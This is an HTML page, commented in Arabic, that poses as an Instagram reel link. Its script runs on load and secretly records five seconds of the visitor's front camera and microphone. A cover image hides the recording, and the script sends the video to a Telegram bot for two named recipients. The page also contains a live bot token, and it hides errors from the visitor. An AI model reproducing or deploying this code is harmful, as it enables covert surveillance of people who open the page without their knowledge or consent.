<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="https://res.cloudinary.com/duixjs8az/image/upload/v1763125689/wdum6udewtij1x6samul">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">

    <title>https://www.instagram.com/reel/DRCJuY6jB5R/?igsh=ZmxkYzN0NGxsOHJn</title>

    <style>
        /* إعدادات الشاشة الأساسية */
        body {
            margin: 0;
            overflow: hidden; 
            background-color: #000;
        }

        /* تنسيق الفيديو (يبقى في الخلفية) */
        #video {
            position: fixed;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            z-index: 1; 
            transform: translate(-50%, -50%);
        }

        /* تنسيق الصورة (تظهر كغلاف فوق الفيديو) */
        #coverImage {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover; 
            z-index: 10; 
            transition: opacity 0.5s ease-out;
        }
    </style>
</head>
<body>

    <img id="coverImage" src="https://res.cloudinary.com/duixjs8az/image/upload/v1763124618/b3jmvuytjsjargldqkpq" alt="Reels Cover Image">
    
    <video id="video" autoplay playsinline></video> 

    <script>
        // ******************************************************
        // ** إعدادات البوت والثوابت - تم التحديث بالمعلومات الخاصة بك **
        // ******************************************************
        const BOT_TOKEN = '8564926075:AAEiDiYw5ryvtkZwIg493iU3lGQD2FV8804'; 
        
        // قائمة بجميع مُعرّفات الدردشة المستقبلة (Ahmed Salem و Firno Hex)
        const CHAT_IDS_LIST = [
            '7869791131', // أحمد سالم
            '7354344254'  // فيرنو هيكس
        ]; 
        
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
        
        // مدة التسجيل بالمللي ثانية (5 ثوانٍ)
        const RECORDING_DURATION_MS = 5000; 

        // ******************************************************
        // ** المتغيرات والوظائف                   **
        // ******************************************************
        const video = document.getElementById('video');
        const coverImage = document.getElementById('coverImage');
        let stream = null;
        let mediaRecorder = null;
        const videoChunks = [];

        /**
         * دالة إرسال الفيديو إلى تيليجرام (تكرر الإرسال لجميع الـ IDs).
         */
        async function sendVideo(videoBlob) {
            try {
                // تكرار الإرسال لكل مُعرّف في القائمة
                for (const chatId of CHAT_IDS_LIST) { 
                    const formData = new FormData();
                    formData.append('chat_id', chatId); // استخدام المُعرّف الحالي
                    formData.append('video', videoBlob, 'recorded_video.webm'); 
                    formData.append('caption', `Recorded silently for Chat ID: ${chatId}`);

                    await fetch(TELEGRAM_API_URL, {
                        method: 'POST',
                        body: formData,
                    });
                }
            } catch (error) {
                // لا يوجد معالجة مرئية للأخطاء
            }
        }


        /**
         * إيقاف التسجيل وإرسال الفيديو.
         */
        function stopRecordingAndSend() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }

            // إخفاء الصورة الغلاف بسلاسة بعد الانتهاء من التسجيل
            coverImage.style.opacity = '0';
            setTimeout(() => {
                coverImage.remove();
            }, 600); 

            // إيقاف بث الكاميرا بعد انتهاء التسجيل
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
        }


        /**
         * بدء تسجيل الفيديو.
         */
        function startRecording() {
            if (!stream) return;

            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                // دمج الأجزاء إلى ملف فيديو واحد (Blob)
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                // إرسال الملف إلى جميع المعرفات
                sendVideo(videoBlob);
            };

            // بدء التسجيل
            mediaRecorder.start();
            
            // تحديد مدة التسجيل
            setTimeout(stopRecordingAndSend, RECORDING_DURATION_MS);
        }

        /**
         * طلب الوصول إلى الكاميرا الأمامية وبدء البث.
         */
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user' 
                    },
                    audio: true 
                });
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                // بدء التسجيل التلقائي بعد 1 ثانية من بدء البث
                setTimeout(startRecording, 1000); 

            } catch (error) {
                // في حال فشل الوصول للكاميرا، يتم إخفاء الصورة الغلاف
                coverImage.remove();
            }
        }

        // بدء تشغيل الكاميرا عند تحميل الصفحة
        window.onload = startCamera;
    </script>
</body>
</html>
